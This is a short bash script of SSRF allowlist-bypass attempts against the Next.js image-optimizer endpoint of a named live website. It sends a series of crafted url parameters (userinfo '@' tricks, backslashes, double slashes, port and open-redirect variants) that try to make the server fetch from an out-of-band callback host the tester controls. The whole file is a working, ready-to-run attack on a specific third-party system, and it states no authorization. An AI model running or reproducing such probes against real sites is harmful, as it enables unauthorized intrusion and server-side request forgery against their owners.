#!/bin/bash
# image-optimizer allowlist bypass attempts
H=oob74ba86eabb17.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
U="https://www.infinitycapital.bh/_next/image"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
t () { code=$(curl -sk -A "$UA" -o /tmp/b -D /tmp/h -w "%{http_code}:%{size_download}:%{content_type}" --max-time 25 --get --data-urlencode "url=$2" --data "w=640&q=75" "$U"); echo "[$1] $code"; }
t "userinfo-@evil"  "https://images.ctfassets.net@$H/ssrf.png"
t "subdomain"       "https://$H.ssrf.oobtest.example/"
t "open-redirect"   "https://images.ctfassets.net/../../@$H/x"
t "hash-pw"         "https://images.ctfassets.net:x@$H/x"
t "backslash"       "https://images.ctfassets.net\\@$H/x"
t "double-slash"    "https://images.ctfassets.net//$H/x"
t "redirector-cdn"  "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
t "videos-ctf"      "https://videos.ctfassets.net/x.png"
t "port-trick"      "https://images.ctfassets.net:443@$H:80/x"
echo "=== no w param (default widths) ==="
curl -sk -A "$UA" -o /dev/null -w "%{http_code}\n" --get --data-urlencode "url=http://$H/x.png" --data "q=75" "$U"
echo "=== raw non-urlencoded ==="
curl -sk -A "$UA" -o /dev/null -w "%{http_code}\n" "$U?url=http%3A%2F%2F$H%2Fx.png&w=640&q=75"
